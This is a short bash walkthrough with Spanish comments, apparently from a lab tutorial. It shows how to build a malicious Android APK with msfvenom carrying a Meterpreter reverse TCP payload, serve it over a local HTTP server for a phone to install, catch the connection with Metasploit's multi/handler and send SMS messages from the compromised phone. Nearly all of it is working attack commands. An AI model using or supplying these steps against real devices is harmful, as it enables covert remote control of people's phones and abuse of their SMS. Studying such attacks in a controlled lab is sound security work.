```bash
# Nos muestra nuestra IP
hostname -I
# Crear la app maliciosa / Generar el payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -o app.apk
# Levantar el servidor http
python -m http.server 80
# Ponemos la ip del servidor http en nuestro movil para descargar la apk e instalarla.
192.168.1.120
# Abrimos la consola
msfconsole
# Usamos el multihandler
use /multi/handler
# Modificamos el payload y lo iniciamos
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.120
set LPORT 443
run
# Nos vamos al movil y pulsamos en la app y ya estariamos en el meterpreter
# Para ver las opciones
help
# Para mandar el sms
send_sms -d (n de telefono) -m mensaje
```